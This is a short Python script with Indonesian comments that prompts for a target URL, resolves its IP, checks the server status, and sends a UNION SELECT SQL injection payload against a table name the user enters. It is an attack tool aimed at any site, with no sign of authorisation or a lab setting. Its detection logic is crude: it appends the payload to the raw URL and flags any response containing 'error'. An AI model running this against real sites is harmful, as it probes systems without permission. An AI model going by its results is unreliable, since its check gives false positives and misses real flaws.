import requests
from urllib.parse import urlparse
import socket

def check_connection(url):
    try:
        requests.get(url, timeout=5)
        return True
    except requests.ConnectionError:
        return False

def check_sql_injection(url, table_name):
    payload = f"' UNION SELECT * FROM {table_name}--"
    response = requests.get(url + payload)
    
    # Periksa apakah terdapat indikasi error database seperti MySQL, PostgreSQL, dll.
    if "error" in response.text.lower():
        print(f"Potensi SQL Injection ditemukan di: {url}")
    else:
        print(f"Tidak ditemukan kerentanan SQL Injection di: {url}")

# Fungsi untuk mendapatkan status server target
def get_server_status(url):
    try:
        response = requests.head(url, timeout=5)
        if response.status_code == 200:
            print(f"Status server: Online")
        else:
            print(f"Status server: {response.status_code}")
    except requests.ConnectionError:
        print("Tidak dapat terhubung ke server.")

# Fungsi utama program
def main():
    url = input("Masukkan URL target: ")
    parsed_url = urlparse(url)
    hostname = parsed_url.hostname
    
    if hostname:
        ip_address = socket.gethostbyname(hostname)
        print(f"Alamat IP dari {hostname} adalah: {ip_address}")
        
        get_server_status(url)

        if check_connection(url):
            print("Koneksi berhasil ke target.")
            table_name = input("Masukkan nama tabel: ")
            check_sql_injection(url, table_name)
        else:
            print("Tidak dapat terhubung ke target.")
    else:
        print("URL tidak valid.")

if __name__ == "__main__":
    main()
    